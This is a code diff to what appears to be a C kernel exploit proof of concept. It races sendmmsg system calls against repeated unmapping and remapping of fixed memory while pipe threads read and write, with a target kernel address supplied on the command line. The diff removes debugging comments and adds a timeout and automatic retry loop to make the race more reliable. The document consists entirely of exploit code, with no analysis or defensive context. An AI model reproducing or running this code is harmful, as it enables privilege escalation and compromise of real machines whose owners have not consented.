@@ -12,7 +12,6 @@
 #include <sys/socket.h>
 #include <sys/stat.h>
 
-
 #define INADDR_LOOPBACK	(0x7f000001)      /* 127.0.0.1   */
 
 unsigned long kill_switch = 0;
@@ -36,6 +35,7 @@ pthread_t mmap_thread;
 static struct iovec mmap_iov[NR_MMAPS];
 
 #define NR_PIPES        (1)
+#define MAX_RACE_SECS	(5)
 struct pipe_pair_t {
 	int fd[2];
 };
@@ -166,11 +166,6 @@ void *sendmmsg_thread_func(void *p)
 		if (kill_switch) { break; }
 
 		retval = sendmmsg(sockfd, &msg, 1, 0);
-		// if (retval == -1) {
-		// 	perror("sendmmsg failed");
-		// }
-
-		// usleep(10);
 	}
 
 SENDMMSG_THREAD_FUNC_EXIT:
@@ -181,19 +176,14 @@ SENDMMSG_THREAD_FUNC_EXIT:
 
 void *mmap_thread_func(void *p)
 {
-	int i;
+	int i = 2;
 
 	for(;; ) {
 		if (kill_switch) { break; }
 		if (i >= NR_MMAPS) { i -= NR_MMAPS; }
-		// if (i >= 3) { i -= 3; }
 
-		// i += 2;
-		i = 2;
 		munmap(mmap_info[i].vaddr, mmap_info[i].len);
 		mmap_info[i].status = MMAP_UNMAPPED;
-
-		// usleep(20);
 
 		mmap_info[i].vaddr = mmap(
 		        (void *)mmap_info[i].base, mmap_info[i].len,
@@ -204,11 +194,7 @@ void *mmap_thread_func(void *p)
 
 		if (mmap_info[i].vaddr == (void *)-1) {
 			perror("mmap failed");
-			// for(;;) { sleep(10); }
 		}
-
-		// i -= 1;
-		i++;
 	}
 
 	pthread_exit(NULL);
@@ -217,24 +203,18 @@ void *mmap_thread_func(void *p)
 static const unsigned long pipe_buf[16] = {
 	0, 0, 0, 0, 0, 0, 0, 0,
 	0, 0, 0, 0, 0, 0, 0, 0,
-	// 0xffffffc00a0b0c0d, 0xffffffc00a0b0c0d,
-	// 0xffffffc00a0b0c0d, 0xffffffc00a0b0c0d,
-	// 0xffffffc00a0b0c0d, 0xffffffc00a0b0c0d,
-	// 0xffffffc00a0b0c0d, 0xffffffc00a0b0c0d,
-	// 0xffffffc00a0b0c0d, 0xffffffc00a0b0c0d,
-	// 0xffffffc00a0b0c0d, 0xffffffc00a0b0c0d,
-	// 0xffffffc00a0b0c0d, 0xffffffc00a0b0c0d,
-	// 0xffffffc00a0b0c0d, 0xffffffc00a0b0c0d,
 };
 void *pipe_write_func(void *arg)
 {
 	int pipe_fd = (int)arg;
 	ssize_t len;
 
-	for (;; ) {
+	for (;;) {
 		if (kill_switch) { break; }
 		write(pipe_fd, pipe_buf, sizeof(pipe_buf));
 	}
+
+	fprintf(stderr, "pipe_write_func quit\n");
 
 	pthread_exit(NULL);
 }
@@ -263,6 +243,10 @@ void *pipe_read_func(void *arg)
 {
 	int pipe_fd = (int)arg;
 	ssize_t len;
+	time_t t1, t2;
+	int c = 0;
+
+	t1 = time(NULL);
 
 	for(;;) {
 		if (kill_switch) { break; }
@@ -272,16 +256,27 @@ void *pipe_read_func(void *arg)
 			pthread_exit(NULL);
 		}
 		usleep(10);
+
+		c++;
+		if ((c & 0x1000) == 0x1000) {
+			c = 0;
+			t2 = time(NULL);
+			if ((t2 - t1) >= MAX_RACE_SECS) {
+				pthread_exit((void *)-1);
+			}
+		}
 	}
 
 	pthread_exit(NULL);
 }
 
+/* Note: adjust rlimit if needed for more allowed open fd */
 int main(int argc, char **argv)
 {
 	int i;
 	int rc;
 	void *thread_retval;
+	int retry;
 
 	if (argc > 1) {
 		target_addr = strtoul(argv[1], NULL, 0);
@@ -289,8 +284,10 @@ int main(int argc, char **argv)
 	fprintf(stderr, "target_addr = %p\n", (void *)target_addr);
 
 	init_sock();
-
 	init_mmap();
+
+redo:
+	retry = 0;
 	init_pipes();
 
 	for (i = 0; i < NR_SOCKS; i++) {
@@ -311,7 +308,6 @@ int main(int argc, char **argv)
 	}
 	kill_switch = 0;
 	sleep(1);
-	// return 0;
 
 	rc = pthread_create(&mmap_thread, NULL, mmap_thread_func, NULL);
 	if (rc) {
@@ -334,11 +330,12 @@ int main(int argc, char **argv)
 		}
 	}
 
-	// sleep(10);
-
 	for (i = 0; i < NR_PIPES; i++) {
 		fprintf(stderr, "join read thread %d...\n", i);
 		pthread_join(pipe_read_threads[i], &thread_retval);
+		if (thread_retval == (void *)-1) {
+			retry = 1;
+		}
 		fprintf(stderr, "done\n");
 	}
 
@@ -347,11 +344,6 @@ int main(int argc, char **argv)
 	fprintf(stderr, "join mmap thread...\n");
 	pthread_join(mmap_thread, &thread_retval);
 	fprintf(stderr, "done\n");
-	// for (i = 0; i < NR_PIPES; i++) {
-	// 	fprintf(stderr, "join write thread %d...\n", i);
-	// 	pthread_join(pipe_write_threads[i], &thread_retval);
-	// 	fprintf(stderr, "done\n");
-	// }
 
 	for (i = 0; i < NR_PIPES; i++) {
 		for(;;) {
@@ -366,6 +358,11 @@ int main(int argc, char **argv)
 			}
 			break;
 		}
+	}
+	fprintf(stderr, "pipe closed\n");
+
+	if (retry) {
+		goto redo;
 	}
 
 	exit(0);
